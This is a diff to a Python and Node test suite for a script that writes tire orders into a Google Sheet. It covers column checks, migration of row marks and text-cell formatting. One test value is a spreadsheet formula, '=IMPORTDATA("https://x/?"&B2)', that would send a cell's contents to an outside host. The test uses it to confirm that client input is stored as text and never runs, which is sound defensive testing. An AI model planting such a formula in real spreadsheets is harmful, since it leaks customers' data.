@@ -29,7 +29,7 @@ class FakeScript:
 
     def __init__(self, columns=sheet.COLUMNS, secret=SECRET):
         self.columns, self.secret = list(columns), secret
-        self.rows, self.posts, self.fail, self.result, self.moved = {}, [], [], None, 0
+        self.rows, self.posts, self.fail, self.result, self.marks = {}, [], [], None, {}
 
     def __call__(self, method, url, headers, body):
         if method == "POST":
@@ -52,7 +52,7 @@ class FakeScript:
         if p.get("secret") != self.secret:
             return {"ok": False, "error": "неверный секрет"}
         if p.get("ping"):
-            return {"ok": True, "missing": [c for c in p["columns"] if c not in self.columns], "moved": self.moved}
+            return dict({"ok": True, "missing": [c for c in p["columns"] if c not in self.columns]}, **self.marks)
         out = []
         for row in p["rows"]:
             lacking = [c for c in row["fields"] if c not in self.columns]
@@ -502,6 +502,7 @@ def test_the_script_knows_the_columns_of_the_panel():
     for name in re.findall(r"'([^']+)'", re.search(r"var DAYS = \[(.*?)\];", code).group(1)) + ["Списание", "Дата счета"]:
         assert name in sheet.COLUMNS, name
     assert "var KEY_COLUMN = 'Дата счета';" in code and "function removeApostrophes()" in code                # the owner 2026-11-01
+    assert "function selfTest()" in code and "function marksBackForRollback()" in code and "/^=/.test(value)" in code
     for name in re.findall(r"'([^']+)'", re.search(r"var PANEL_COLUMNS = \[(.*?)\];", code, re.S).group(1)):
         assert name in sheet.COLUMNS, name
     assert "body.secret !== secret" in code and "LockService" in code and "row.create" in code and "typeof value === 'string'" in code
@@ -638,6 +639,7 @@ Sheet.prototype.set = function (r, c, v) {
   while (this.cells.length < r) this.cells.push(new Array(this.width()).fill(''));
   this.raw[r + ',' + c] = v;
   if (typeof v === 'string' && v.charAt(0) === "'") v = v.slice(1);
+  else if (typeof v === 'string' && this.formats[r + ',' + c] === '@' && v.charAt(0) !== '=') { /* «обычный текст»: not parsed */ }
   else if (typeof v === 'string' && /^[=+\-@]/.test(v)) { this.formulas[r + ',' + c] = v; v = 'FORMULA(' + v + ')'; }
   else if (typeof v === 'string' && this.formats[r + ',' + c] !== '@' && /^\d+$/.test(v) && v.charAt(0) !== '0') v = Number(v);   // as Google: a
   // number-looking text in a cell not «обычный текст» becomes a number (a leading zero would be lost: never taken as text then)
@@ -674,6 +676,8 @@ Sheet.prototype.getRange = function (r, c, nr, nc) {
     getValues: function () { return grid(function (i, j) { return sheet.get(i, j); }); },
     getDisplayValues: function () { return grid(function (i, j) { return String(sheet.get(i, j)); }); },
     getFormulas: function () { return grid(function (i, j) { return sheet.formulas[i + ',' + j] || ''; }); },
+    getValue: function () { return sheet.get(r, c); },
+    getFormula: function () { return sheet.formulas[r + ',' + c] || ''; },
     getNotes: function () { return grid(function (i, j) { return sheet.notes[i + ',' + j] || ''; }); },
     setNote: function (v) { sheet.notes[r + ',' + c] = v; return this; },
     setNotes: function (rows) { rows.forEach(function (row, i) { row.forEach(function (v, j) { sheet.notes[(r + i) + ',' + (c + j)] = v; }); }); return this; },
@@ -697,7 +701,11 @@ sheet.set(6, col['Списание'], false);                                   
 var second = new Sheet(header, 2);                                         // another sheet: its last taken row is a formula that shows nothing
 second.formula(2, col['Прибыль ₽'], '=IF(K2="";"";K2)');
 var Book = {getSheetByName: function (n) { return n === 'Заказы' ? sheet : n === 'Второй' ? second : null; }};
-var SpreadsheetApp = {getActiveSpreadsheet: function () { return Book; }, flush: function () {}};
+var SpreadsheetApp = {getActiveSpreadsheet: function () { return Book; }, flush: function () {},
+                      getUi: function () { throw new Error('Cannot call SpreadsheetApp.getUi() from this context'); }};
+var probes = [];
+Book.insertSheet = function (name) { var made = new Sheet(['x'], 20); probes.push(name); return made; };
+Book.deleteSheet = function () { probes.push('deleted'); };
 var PropertiesService = {getScriptProperties: function () { return {getProperty: function (k) { return k === 'SECRET' ? SECRET : null; }}; }};
 var LockService = {getScriptLock: function () { return {tryLock: function () { return true; }, releaseLock: function () {}}; }};
 var Logger = {log: function () {}};
@@ -759,6 +767,8 @@ out.removed = removeApostrophes();
 out.cleaned = {number: sheet.raw[ours + ',' + col['№ заказа MIM']], fmt: sheet.formats[ours + ',' + col['№ заказа MIM']],
                qty: sheet.raw[ours + ',' + col['Кол-во']], qtyFmt: sheet.formats[ours + ',' + col['Кол-во']] || '',
                manual: sheet.raw['2,' + col['Имя']], box: sheet.get(Number(ours), col['Списание'])};
+out.selfTest = selfTest();
+out.probes = probes.length === 2 && probes[1] === 'deleted';
 console.log(JSON.stringify(out));
 """
 
@@ -770,12 +780,12 @@ def test_the_script_on_a_fake_of_google_sheets(tmp_path):
     done = subprocess.run(["node", str(path)], capture_output=True, text=True)
     assert done.returncode == 0, done.stderr
     out = json.loads(done.stdout)
-    assert out["ping"] == {"ok": True, "missing": ["Нет такой"], "moved": 0} and out["wrong"] == {"ok": False, "error": "неверный секрет"}
+    assert out["ping"] == {"ok": True, "missing": ["Нет такой"], "moved": 0, "marked": 0, "blocked": 0} and out["wrong"] == {"ok": False, "error": "неверный секрет"}
     assert out["create"]["results"] == [{"key": "tires:1:1", "status": "created"}, {"key": "tires:1:2", "status": "created"}]
     assert out["again"]["results"] == [{"key": "tires:1:1", "status": "updated"}] and out["rowsAfterCreate"] == 7    # no double row
     assert out["at"] == {"one": "tires:1:1", "two": "tires:1:2"}           # under the owner's rows «Итого» and the formula, over the checkbox; rows added
     assert out["kept"] == {"total": "Итого", "sum": "=SUM(K2:K2)", "empty": '=IF(K4="";"";K4)', "name3": "", "name4": "", "note5": "Заберут 02/08", "name5": ""}
-    assert out["text"] == {"phone": "'+7 911 111-22-33", "note": '=IMPORTDATA("https://x/?"&B2)', "qty": 4, "day": 12, "fmt": "dd.mm.yyyy",
+    assert out["text"] == {"phone": "+7 911 111-22-33", "note": '=IMPORTDATA("https://x/?"&B2)', "qty": 4, "day": 12, "fmt": "dd.mm.yyyy",
                            "box": "checkbox", "manual": "Ручная строка"}             # text as text: a formula of a client never runs (only
                                                                                  # «=+-@» keep the apostrophe, 2026-11-01)
     assert out["update"]["results"] == [{"key": "tires:1:1", "status": "updated"}]
@@ -786,10 +796,12 @@ def test_the_script_on_a_fake_of_google_sheets(tmp_path):
     assert out["secondAt"] == {"formula": '=IF(K2="";"";K2)', "note2": "", "note3": "tires:2:1"}                     # under the formula, not on it
     assert out["lacking"]["results"][0]["status"] == "error" and out["manualAfter"] == ["Итого"]
     # the owner 2026-11-01: the marks move from «Дата» to «Дата счета» (never over a note there), once; text without the apostrophe
-    assert out["oldPing"] == {"ok": True, "missing": [], "moved": 1} and out["oldPingAgain"]["moved"] == 0
+    assert out["oldPing"] == {"ok": True, "missing": [], "moved": 1, "marked": 1, "blocked": 1}               # «своё примечание»: blocked
+    assert out["oldPingAgain"] == {"ok": True, "missing": [], "moved": 0, "marked": 1, "blocked": 1}
     assert out["oldUpdate"]["results"] == [{"key": "tires:5:1", "status": "updated"}]                     # an old row is still found
     assert out["oldAfter"] == {"mark": "tires:5:1", "own": "своё примечание", "oldMark": "tires:5:1", "phone": "89811724133",
                                "phoneType": "string", "phoneFmt": "@", "number": "05300825"}            # text stays text, the zero stays
+    assert out["selfTest"] == "OK: текст пишется как текст, без апострофа." and out["probes"]                # the temporary sheet is gone
     assert out["removed"] >= 1 and out["cleaned"]["number"] == "5300825" and out["cleaned"]["fmt"] == "@"
     assert out["cleaned"]["qty"] == 4 and out["cleaned"]["qtyFmt"] == "" and out["cleaned"]["manual"] == "'Ручная строка"   # a number and
 
@@ -804,9 +816,12 @@ def test_a_sheet_without_the_note_column_still_takes_the_rows_and_the_invoice_da
     with pytest.raises(sheet.SheetError, match="нет колонок: Дата счета"):
         sheet.check(conn, box, fake)
     fake.columns = [c for c in sheet.COLUMNS if c != "Примечание"]
-    fake.moved = 12                                                        # «Проверить» moved the marks of «Дата» (the owner 2026-11-01)
-    assert sheet.check(conn, box, fake).endswith("Метки строк перенесены из «Дата» в «Дата счета»: 12 — колонку «Дата» теперь можно удалить.")
-    fake.moved = 0
+    fake.marks = {"moved": 12, "marked": 40, "blocked": 0}                # «Проверить» moved the marks of «Дата» (the owner 2026-11-01)
+    said = sheet.check(conn, box, fake)
+    assert said.endswith("Строк с меткой в «Дата счета»: 40, перенесено сейчас из «Дата»: 12, не перенесено: 0.") and "пока не удаляйте" not in said
+    fake.marks = {"moved": 0, "marked": 38, "blocked": 2}                 # two rows had a note of the owner in «Дата счета»
+    assert "не перенесено: 2. Колонку «Дата» пока не удаляйте: у 2 строк в «Дата счета» уже есть своё примечание" in sheet.check(conn, box, fake)
+    fake.marks = {}
     mine = placed(conn, comment="Позвонить вечером")
     assert sheet.check(conn, box, fake) == "Таблица отвечает: лист «Заказы», все колонки на месте."
     assert mine in sheet.flush(conn, box, fake, NOW)
